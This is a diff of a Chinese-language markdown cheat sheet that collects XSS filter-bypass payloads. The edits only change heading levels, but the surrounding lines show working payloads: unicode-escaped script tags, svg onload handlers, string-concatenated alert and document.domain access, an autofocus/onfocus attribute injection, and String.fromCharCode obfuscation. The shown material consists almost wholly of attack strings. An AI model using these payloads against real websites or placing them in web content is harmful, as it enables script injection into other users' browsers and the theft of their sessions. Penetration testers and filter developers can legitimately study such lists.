@@ -1,6 +1,6 @@
-## XSS绕过相关payload总结
+# XSS绕过相关payload总结
 
-### 一、工作中使用和收集payload：
+## 一、工作中使用和收集payload：
 
 ```html
 <script%20~~~>\u0061\u006C\u0065\u0072\u0074``</script%20~~~>
@@ -85,7 +85,7 @@ javascript:a=alert;a(1);
 <svg/onload=((pro\u006dpt))(`1${alert`2`}`)//
 ```
 
-### 二、相关弹框Bypass
+## 二、相关弹框Bypass
 
 ```html
 ['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
@@ -138,7 +138,7 @@ alert(this['document']['domain']);
 "onfocus="alert('xiaohuihui')"+autofocus="
 ```
 
-### 三、FUZZ相关html事件
+## 三、FUZZ相关html事件
 
 ```html
 <IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
